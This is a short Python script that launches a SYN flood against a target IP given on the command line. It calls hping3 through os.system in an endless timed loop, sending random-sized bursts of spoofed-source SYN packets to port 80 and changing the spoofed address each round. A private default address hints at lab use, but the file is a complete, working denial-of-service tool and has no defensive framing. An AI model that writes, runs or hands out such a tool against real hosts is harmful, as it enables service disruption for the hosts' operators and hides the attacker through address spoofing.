from threading import Timer
from random import randint, uniform
import os
import sys

host_ip = "10.1.1.10"
host_ip = sys.argv[1]

def display():
    pkt_cnt = randint(1, 100)
    rand_timer = randint(1, 3)
    i1 = randint(0, 190)
    i2 = randint(0, 255)
    i3 = randint(0, 255)
    i4 = randint(0, 255)
    rand_ip = str(i1) + '.' + str(i2) + '.' + str(i3) + '.' + str(i4)
    os.system("hping3 -S -V -p 80 -i u100 -c %s --spoof %s %s" %(pkt_cnt, rand_ip, host_ip))
    print("Command: hping3 -S -V -p 80 -i u100 -c %s --spoof %s %s \n\n" % (pkt_cnt, rand_ip, host_ip))  
    Timer(rand_timer, display).start()

display()
